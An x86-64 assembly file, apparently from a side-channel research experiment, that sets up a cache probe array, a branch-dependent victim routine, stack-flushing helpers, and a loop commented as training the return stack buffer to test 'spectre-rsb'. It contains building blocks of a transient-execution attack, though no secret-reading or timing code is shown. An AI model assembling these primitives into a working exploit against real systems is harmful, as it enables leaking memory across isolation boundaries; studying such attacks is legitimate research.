.data

.global probe_array
probe_array:
    .space 4096 * 256, 0x0


dummy:
    .space 0x1000, 0x0

.text

.extern usleep


.global vic
.align 0x1000
vic:
    pushf
    lea probe_array, %r12
    lea target, %r13
    lea safe, %r14
    mov %si, (%r13)
    mov %si, (%r14)
    xor %rax, %rax
    .rep 10
    imul %rdi, %rdi
    .endr
    mov %rdi, %rax
    shl $8, %rax
    sahf                   # save flags
    
    jc target
safe:
    nop
    nop
    mov $0x61, %rax
    shl $12, %rax
    mov (%r12, %rax, 1), %r13b

    lahf
    popf
    ret

target:
    nop
    nop                 # 90
    mov $0x62, %rax
    shl $12, %rax
    mov (%r12, %rax, 1), %r13b
    
    lahf
    popf                # 9d
    ret                 # c3


.global do_nothing
do_nothing:
    push %rbp
    mov %rsp, %rbp

    pop %rdi
    pop %rdi

mov $0x6a, %rax
    mov $10000, %rcx
long_loop:
    imul %rax, %rax
    lea dummy, %rbx
    mov %rax, (%rbx)
    
    sub $1, %rcx
    jnz long_loop
    # leaveq
    pop %rbp

    clflush (%rsp)
    cpuid

    retq


.global do_something
do_something:

    # lea do_nothing, %r8
    # call *%r8

    # pop %rdi
    # pop %rdi
    # do something to consume time


    clflush (%rsp)

    cpuid
    retq


.global train_rsb
.align 0x1000
train_rsb:
    push %rbp
    mov %rsp, %rbp

    lea do_something, %r13
    lea probe_array, %r12

    # a loop to train rsb
    mov $100, %rcx
loop_start:

    mov $0xfe, %rax
    call *%r13    # use call to fill rsb


.global gadget
gadget:
    # test spectre-rsb
    
    xor %rax, %rax
    mov $0x6f, %rax
    shl $12, %rax
    mov (%r12, %rax, 1), %r14b

    sub $1, %rcx
    jnz loop_start
loop_stop:

    mov $0xff, %rax
    pop %rbp
    ret
